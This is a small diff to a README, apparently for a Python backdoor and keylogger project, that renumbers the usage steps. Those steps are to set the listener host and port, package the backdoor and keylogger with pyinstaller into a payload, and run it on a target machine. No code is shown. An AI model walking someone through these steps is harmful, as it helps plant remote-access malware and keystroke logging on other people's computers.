@@ -19,7 +19,7 @@ Features:
 **How to use?**
 
 ```
->edit the host and the port for the listener.py and the backdoor.py
->and then "compile" the backdoor.py and the keylogger.py using pyinstaller to create a payload
->start the listener.py on your target machine and execute the payload on your target machine
+1. edit the host and the port for the listener.py and the backdoor.py
+2. and then "compile" the backdoor.py and the keylogger.py using pyinstaller to create a payload
+3. start the listener.py on your target machine and execute the payload on your target machine
 ```
